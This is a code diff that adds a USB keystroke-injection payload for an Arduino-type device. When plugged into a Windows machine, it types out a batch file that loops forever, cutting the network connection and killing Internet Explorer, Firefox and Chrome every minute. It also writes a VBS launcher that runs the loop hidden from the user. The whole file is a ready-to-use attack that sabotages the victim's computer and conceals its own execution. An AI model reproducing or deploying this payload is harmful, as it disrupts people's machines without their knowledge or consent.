@@ -1,0 +1,62 @@
+#include "exfil.h"
+#include "phukd.h"
+
+void payload() {
+  delay(2000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.println("cmd /Q /D /T:7F /F:OFF /V:OFF /K");
+  delay(3000);
+  Keyboard.println("cd %userprofile%\\Downloads\\");
+  delay(2000);
+  Keyboard.println("erase /Q a.bat");
+  delay(2000);
+  Keyboard.println("copy con a.bat");
+  delay(2000);
+  Keyboard.println("@echo off");
+  delay(2000);
+  Keyboard.println(":Start");
+  delay(2000);
+  Keyboard.println("ipconfig /release");
+  delay(2000);
+  Keyboard.println("taskkill /f /im \"iexplore.exe\"");
+  delay(2000);
+  Keyboard.println("taskkill /f /im \"firefox.exe\"");
+  delay(2000); 
+  Keyboard.println("taskkill /f /im \"chrome.exe\"");
+  delay(2000);
+  Keyboard.println("timeout /t 60");
+  delay(2000);
+  Keyboard.println("Goto Start");
+  delay(2000);
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('z');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(2000);
+  Keyboard.press(KEY_RETURN);
+  delay(100);
+  Keyboard.releaseAll();
+  delay(2000);
+  Keyboard.println("erase /Q invis.vbs");
+  delay(2000);
+  Keyboard.println("copy con invis.vbs");
+  delay(2000);
+  Keyboard.println("CreateObject(\"Wscript.Shell\").Run \"\"\"\" & WScript.Arguments(0) & \"\"\"\", 0, False");
+  delay(2000);
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('z');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(2000);
+  Keyboard.press(KEY_RETURN);
+  delay(100);
+  Keyboard.releaseAll();
+  delay(2000);
+  Keyboard.println("wscript.exe invis.vbs a.bat");
+  delay(2000);
+  Keyboard.println("exit");
+}
